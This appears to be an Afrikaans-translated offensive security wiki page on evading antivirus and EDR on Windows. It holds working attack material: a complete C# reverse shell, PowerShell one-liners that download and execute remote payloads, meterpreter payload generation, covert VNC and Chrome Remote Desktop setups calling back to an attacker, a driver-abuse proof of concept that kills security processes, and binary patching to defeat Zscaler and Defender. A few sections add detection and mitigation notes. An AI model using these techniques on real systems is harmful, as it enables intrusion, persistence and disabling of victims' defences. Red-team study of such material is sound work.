**MoTW** (Mark of The Web) is 'n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier wat outomaties geskep word wanneer files van die internet afgelaai word, saam met die URL waarvandaan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir 'n file wat van die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om daarop te let dat executables wat met 'n **trusted** signing certificate onderteken is **nie SmartScreen sal aktiveer nie**.

'n Baie effektiewe manier om te keer dat jou payloads die Mark of The Web kry, is om hulle binne-in 'n soort container soos 'n ISO te verpak. Dit gebeur omdat Mark-of-the-Web (MOTW) **nie** op **non NTFS** volumes toegepas kan word nie.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is 'n tool wat payloads in output containers verpak om Mark-of-the-Web te ontduik.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier is ’n demo vir SmartScreen-omseiling deur payloads binne ISO-lêers te verpak met [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is ’n kragtige logging-meganisme in Windows wat toelaat dat toepassings en stelselkomponente **events log**. Dit kan egter ook deur security-produkte gebruik word om kwaadwillige aktiwiteite te monitor en op te spoor.

Soos AMSI disabled (bypassed) word, is dit ook moontlik om die **`EtwEventWrite`**-funksie van die user space-proses te laat terugkeer sonder om enige events te log. Dit word gedoen deur die funksie in memory te patch om onmiddellik terug te keer, en ETW-logging vir daardie proses effektief te disable.

Jy kan meer info vind in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Om C# binaries in memory te load is al vir ’n geruime tyd bekend en dit is steeds ’n baie goeie manier om jou post-exploitation tools te run sonder om deur AV gevang te word.

Aangesien die payload direk in memory gelaai sal word sonder om disk aan te raak, hoef ons net bekommerd te wees oor die patching van AMSI vir die hele proses.

Meeste C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die ability om C# assemblies direk in memory uit te voer, maar daar is verskillende maniere om dit te doen:

- **Fork\&Run**

Dit behels **die spawn van ’n nuwe sacrificial proses**, om jou post-exploitation kwaadwillige code in daardie nuwe proses in te inject, jou kwaadwillige code uit te voer en, wanneer klaar, die nuwe proses te kill. Dit het beide voordele en nadele. Die voordeel van die fork and run-metode is dat execution **buite** ons Beacon implant-proses plaasvind. Dit beteken dat as iets in ons post-exploitation-aksie verkeerd loop of gevang word, daar ’n **baie groter kans** is dat ons **implant sal oorleef.** Die nadeel is dat jy ’n **groter kans** het om deur **Behavioural Detections** gevang te word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit gaan daaroor om die post-exploitation kwaadwillige code **in sy eie proses** te inject. Op dié manier kan jy vermy om ’n nuwe proses te skep en dit deur AV te laat scan, maar die nadeel is dat as iets verkeerd gaan met die execution van jou payload, daar ’n **baie groter kans** is om jou **beacon te verloor** aangesien dit kan crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> As jy meer oor C# Assembly loading wil lees, kyk gerus na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C# Assemblies **van PowerShell af** load; kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t se video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige code uit te voer met ander languages deur die gekompromitteerde masjien toegang te gee **tot die interpreter environment wat op die Attacker Controlled SMB share geïnstalleer is**.

Deur toegang tot die Interpreter Binaries en die environment op die SMB share toe te laat, kan jy **arbitrary code in these languages within memory** van die gekompromitteerde masjien uitvoer.

Die repo dui aan: Defender scan steeds die scripts, maar deur Go, Java, PHP ens te gebruik het ons **meer flexibility om static signatures te bypass**. Testing met lukrake, nie-obfuscated reverse shell scripts in hierdie languages was suksesvol.

## TokenStomping

Token stomping is ’n technique wat ’n attacker toelaat om die **access token of ’n security prouct soos ’n EDR of AV te manipuleer**, wat hulle in staat stel om sy privileges te reduce sodat die proses nie sterf nie, maar ook nie permissions het om na kwaadwillige aktiwiteite te kyk nie.

Om dit te voorkom, kan Windows **eksterne prosesse verhinder** om handles oor die tokens van security-prosesse te kry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Soos beskryf in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om net die Chrome Remote Desktop op ’n victim se PC te deploy en dit dan te gebruik om dit oor te neem en persistence te handhaaf:
1. Download vanaf https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI file vir Windows om die MSI file te download.
2. Run die installer silently op die victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop-bladsy en klik next. Die wizard sal dan vra dat jy authorize; klik die Authorize button om voort te gaan.
4. Execute die gegewe parameter met ’n paar aanpassings: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Let op die pin param wat toelaat om die pin te set sonder om die GUI te gebruik).


## Advanced Evasion

Evasion is ’n baie komplekse onderwerp; soms moet jy baie verskillende bronne van telemetry in net een stelsel in ag neem, so dit is byna onmoontlik om heeltemal undetected te bly in volwasse omgewings.

Elke environment waarteen jy gaan, sal hul eie sterk punte en swakhede hê.

Ek beveel sterk aan dat jy hierdie praatjie van [@ATTL4S](https://twitter.com/DaniLJ94) gaan kyk, om ’n foothold te kry in meer Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

his is ook nog ’n uitstekende praatjie van [@mariuszbit](https://twitter.com/mariuszbit) oor Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik, wat **dele van die binary sal verwyder** totdat dit **uitvind watter deel Defender** as malicious beskou en dit vir jou verdeel.\
Nog ’n tool wat **dieselfde ding doen is** [**avred**](https://github.com/dobin/avred) met ’n open web wat die diens aanbied by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Tot Windows10 het alle Windows ’n **Telnet server** gekom wat jy (as administrator) kon install deur:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Maak dit **begin** wanneer die stelsel **begin** en **loop** dit nou:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Verander telnet-poort** (stealth) en deaktiveer firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Laai dit af van: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin downloads hê, nie die setup nie)

**OP DIE HOST**: Voer _**winvnc.exe**_ uit en konfigureer die server:

- Aktiveer die opsie _Disable TrayIcon_
- Stel 'n wagwoord in _VNC Password_
- Stel 'n wagwoord in _View-Only Password_

Skuif dan die binary _**winvnc.exe**_ en **nuut** geskepde lêer _**UltraVNC.ini**_ binne die **victim**

#### **Reverse connection**

Die **attacker** moet binne sy **host** die binary `vncviewer.exe -listen 5900` uitvoer sodat dit **gereed** is om 'n reverse **VNC connection** te vang. Dan, binne die **victim**: Start die winvnc daemon `winvnc.exe -run` en run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Om stealth te behou moet jy nie 'n paar dinge doen nie

- Moenie `winvnc` start as dit reeds run nie, of jy sal 'n [popup](https://i.imgur.com/1SROTTl.png) trigger. check of dit run met `tasklist | findstr winvnc`
- Moenie `winvnc` start sonder `UltraVNC.ini` in dieselfde directory nie, of dit sal veroorsaak dat [the config window](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moenie `winvnc -h` run vir help nie, of jy sal 'n [popup](https://i.imgur.com/oc18wcu.png) trigger

### GreatSCT

Download dit van: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Binne GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Begin nou **die lister** met `msfconsole -r file.rc` en **voer** die **xml payload** uit met:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Huidige verdediger sal die proses baie vinnig beëindig.**

### Ons eie reverse shell kompileer

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Revershell

Kompileer dit met:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Gebruik dit met:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators lys: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Using python for build injectors example:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Other tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 het `Antivirus Terminator` gebruik, 'n klein konsole-hulpmiddel, om endpoint-beskerming te deaktiveer voordat ransomware laat val is. Die hulpmiddel bring sy **eie kwesbare maar *gesigneerde* driver** en misbruik dit om bevoorregte kernel-operasies uit te voer wat selfs Protected-Process-Light (PPL) AV-dienste nie kan blokkeer nie.

Key take-aways
1. **Signed driver**: Die lêer wat na skyf afgelewer word is `ServiceMouse.sys`, maar die binêre is die wettig gesigneerde driver `AToolsKrnl64.sys` van Antiy Labs se “System In-Depth Analysis Toolkit”. Omdat die driver 'n geldige Microsoft-handtekening dra, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) geaktiveer is.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die eerste reël registreer die driver as 'n **kernel service** en die tweede een begin dit sodat `\\.\ServiceMouse` vanaf user land toeganklik word.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Beëindig 'n arbitrêre proses volgens PID (gebruik om Defender/EDR-dienste te kill) |
| `0x990000D0` | Verwyder 'n arbitrêre lêer op skyf |
| `0x990001D0` | Laai die driver af en verwyder die service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD slaan user-mode protections heeltemal oor; code wat in die kernel uitvoer, kan *protected* processes oopmaak, dit beëindig, of kernel objects manipuleer, ongeag PPL/PP, ELAM of ander hardening features.

Detection / Mitigation
•  Skakel Microsoft se vulnerable-driver block list (`HVCI`, `Smart App Control`) aan sodat Windows weier om `AToolsKrnl64.sys` te laai.
•  Monitor skep van nuwe *kernel* services en waarsku wanneer 'n driver vanaf 'n world-writable directory gelaai word of nie op die allow-list teenwoordig is nie.
•  Hou dop vir user-mode handles na custom device objects gevolg deur verdagte `DeviceIoControl` calls.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler se **Client Connector** pas device-posture rules plaaslik toe en maak staat op Windows RPC om die resultate met ander komponente te kommunikeer. Twee swak ontwerpkeuses maak 'n volle bypass moontlik:

1. Posture evaluation gebeur **heeltemal aan die client-kant** ('n boolean word na die server gestuur).
2. Internal RPC endpoints valideer slegs dat die connecting executable **deur Zscaler gesigned** is (via `WinVerifyTrust`).

Deur **vier gesigneerde binaries op skyf te patch** kan albei meganismes geneutraliseer word:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gee altyd `1` terug, so elke check is compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ enige (selfs unsigned) proses kan aan die RPC pipes bind |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang deur `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nadat die oorspronklike lêers vervang is en die diensstapel herbegin is:

* **Al** posture checks vertoon **groen/compliant**.
* Ongetekende of gewysigde binaries kan die named-pipe RPC endpoints oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde gasheer kry onbeperkte toegang tot die interne netwerk wat deur die Zscaler policies gedefinieer is.

Hierdie case study demonstreer hoe suiwer client-side trust decisions en eenvoudige signature checks met ’n paar byte patches verslaan kan word.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) dwing ’n signer/level hierarchy af sodat net gelyk-of-hoër protected processes mekaar kan tamper. Offensief, as jy ’n PPL-enabled binary wettig kan launch en sy arguments kan beheer, kan jy benign functionality (bv. logging) omskep in ’n constrained, PPL-backed write primitive teen protected directories wat deur AV/EDR gebruik word.

Wat maak dat ’n process as PPL run
- Die target EXE (en enige loaded DLLs) moet signed wees met ’n PPL-capable EKU.
- Die process moet met CreateProcess geskep word met die flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- ’n Compatible protection level moet aangevra word wat ooreenstem met die signer van die binary (bv. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware signers, `PROTECTION_LEVEL_WINDOWS` vir Windows signers). Verkeerde levels sal by creation faal.

Sien ook ’n breër intro tot PP/PPL en LSASS protection hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (kies protection level en stuur arguments deur na die target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitief: ClipUp.exe
- Die ondertekende stelselbinary `C:\Windows\System32\ClipUp.exe` self-spawn en aanvaar ’n parameter om ’n loglêer na ’n roeperspesifieke pad te skryf.
- Wanneer dit as ’n PPL-proses geloods word, vind die lêerskryf plaas met PPL-backing.
- ClipUp kan nie paaie met spasies ontleed nie; gebruik 8.3 short paths om na normaalweg beskermde liggings te wys.

8.3 short path helpers
- Lys short names: `dir /x` in elke ouergids.
- Lei short path af in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Misbruikketting (abstrak)
1) Begin die PPL-capable LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur ’n launcher te gebruik (bv. CreateProcessAsPPL).
2) Gee die ClipUp log-pad argument om ’n lêerskepping in ’n beskermde AV-gids af te dwing (bv. Defender Platform). Gebruik 8.3 short names indien nodig.
3) As die teikenbinary normaalweg oop/ge-lock is deur die AV terwyl dit loop (bv. MsMpEng.exe), skeduleer die skryf by boot voordat die AV begin deur ’n auto-start service te installeer wat betroubaar vroeër loop. Valideer boot ordering met Process Monitor (boot logging).
4) By reboot vind die PPL-backed skryf plaas voordat die AV sy binaries lock, korrupteer die teikenlêer en verhoed startup.

Voorbeeld-invokasie (paaie verwyder/verkort vir veiligheid):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas en beperkings
- Jy kan nie die inhoud wat ClipUp skryf verder beheer as plasing nie; die primitief is meer geskik vir korrupsie as vir presiese inhoud-inspuiting.
- Vereis local admin/SYSTEM om ’n service te installeer/start en ’n reboot-venster.
- Tydsberekening is krities: die teiken moet nie oop wees nie; boot-time execution vermy file locks.

Detections
- Process creation van `ClipUp.exe` met ongewone arguments, veral wanneer dit deur nie-standaard launchers geparent is, rondom boot.
- Nuwe services gekonfigureer om suspicious binaries auto-start te laat en wat konsekwent voor Defender/AV begin. Ondersoek service creation/modification voor Defender startup failures.
- File integrity monitoring op Defender binaries/Platform directories; onverwagte file creations/modifications deur processes met protected-process flags.
- ETW/EDR telemetry: soek vir processes wat met `CREATE_PROTECTED_PROCESS` geskep is en anomale PPL level usage deur nie-AV binaries.

Mitigations
- WDAC/Code Integrity: beperk watter signed binaries as PPL mag loop en onder watter parents; blok ClipUp invocation buite legitieme kontekste.
- Service hygiene: beperk creation/modification van auto-start services en monitor start-order manipulation.
- Maak seker Defender tamper protection en early-launch protections is geaktiveer; ondersoek startup errors wat binary corruption aandui.
- Oorweeg om 8.3 short-name generation op volumes wat security tooling huisves te deaktiveer indien dit met jou environment versoenbaar is (toets deeglik).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender kies die platform waarvan dit loop deur subfolders onder die volgende te enumereer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Dit kies die subfolder met die hoogste lexicographic version string (byvoorbeeld `4.18.25070.5-0`), en begin dan die Defender service processes van daar af (met service/registry paths wat dienooreenkomstig opgedateer word). Hierdie selection vertrou directory entries insluitend directory reparse points (symlinks). ’n Administrator kan dit gebruik om Defender na ’n attacker-writable path te herlei en DLL sideloading of service disruption te bereik.

Preconditions
- Local Administrator (nodig om directories/symlinks onder die Platform folder te skep)
- Vermoë om te reboot of Defender platform re-selection te trigger (service restart op boot)
- Slegs built-in tools benodig (mklink)

Why it works
- Defender blok writes in sy eie folders, maar sy platform selection vertrou directory entries en kies die lexicographically hoogste version sonder om te valideer dat die target na ’n protected/trusted path oplos.

Step-by-step (example)
1) Berei ’n writable clone van die huidige platform folder voor, byvoorbeeld `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Skep 'n hoër-weergawe gids-simboliese skakel binne Platform wat na jou gids wys:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Snellerkeuse aktiveer (herbegin aanbeveel):
```cmd
shutdown /r /t 0
```
4) Verifieer dat MsMpEng.exe (WinDefend) vanaf die herlei pad loop:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Jy behoort die nuwe prosespad onder `C:\TMP\AV\` waar te neem en die dienskonfigurasie/registry wat daardie ligging weerspieël.

Post-exploitation opsies
- DLL sideloading/code execution: Drop/vervang DLLs wat Defender vanaf sy toepassingsgids laai om code uit te voer in Defender se processes. Sien die afdeling hierbo: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Verwyder die version-symlink sodat by die volgende start die gekonfigureerde path nie resolve nie en Defender faal om te start:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Let daarop dat hierdie tegniek nie op sigself privilege escalation bied nie; dit vereis admin rights.

## API/IAT Hooking + Call-Stack Spoofing met PIC (Crystal Kit-style)

Red teams kan runtime evasion uit die C2 implant skuif en dit in die target module self plaas deur sy Import Address Table (IAT) te hook en geselekteerde APIs deur attacker-controlled, position‑independent code (PIC) te stuur. Dit generaliseer evasion verder as die klein API surface wat baie kits blootstel (bv. CreateProcessA), en brei dieselfde protections uit na BOFs en post‑exploitation DLLs.

Hoëvlak-benadering
- Stage ’n PIC blob langs die target module met ’n reflective loader (prepended of companion). Die PIC moet self-contained en position‑independent wees.
- Soos die host DLL laai, loop deur sy IMAGE_IMPORT_DESCRIPTOR en patch die IAT entries vir geteikende imports (bv. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) om na dun PIC wrappers te wys.
- Elke PIC wrapper voer evasions uit voor dit die regte API address met tail-calling aanroep. Tipiese evasions sluit in:
- Memory mask/unmask rondom die call (bv. encrypt beacon regions, RWX→RX, verander page names/permissions) en herstel dit dan post-call.
- Call-stack spoofing: bou ’n benign stack en transition in die target API sodat call-stack analysis na verwagte frames resolve.
- Vir compatibility, export ’n interface sodat ’n Aggressor script (of ekwivalent) kan registreer watter APIs om te hook vir Beacon, BOFs en post-ex DLLs.

Waarom IAT hooking hier
- Werk vir enige code wat die hooked import gebruik, sonder om tool code te verander of op Beacon staat te maak om spesifieke APIs te proxy.
- Dek post-ex DLLs: hooking LoadLibrary* laat jou module loads intercept (bv. System.Management.Automation.dll, clr.dll) en dieselfde masking/stack evasion op hul API calls toepas.
